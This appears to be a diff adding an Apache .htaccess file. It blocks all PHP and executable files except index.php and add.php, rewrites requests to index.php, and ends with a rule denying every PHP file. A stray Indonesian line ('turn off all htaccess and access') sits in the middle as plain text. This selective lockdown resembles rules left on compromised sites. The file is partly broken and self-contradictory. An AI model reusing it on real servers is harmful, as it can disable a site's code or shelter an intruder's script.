@@ -1,0 +1,29 @@
+<FilesMatch ".(py|exe|php|phps|phtml|php2|php3|php4|php5|php6|php7|php8)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(index.php|add.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+
+matikan semua htaccess dan akses
+
+<FilesMatch "\.(?i:php)$">
+  <IfModule !mod_authz_core.c>
+    Order allow,deny
+    Deny from all
+  </IfModule>
+  <IfModule mod_authz_core.c>
+    Require all denied
+  </IfModule>
+</FilesMatch>
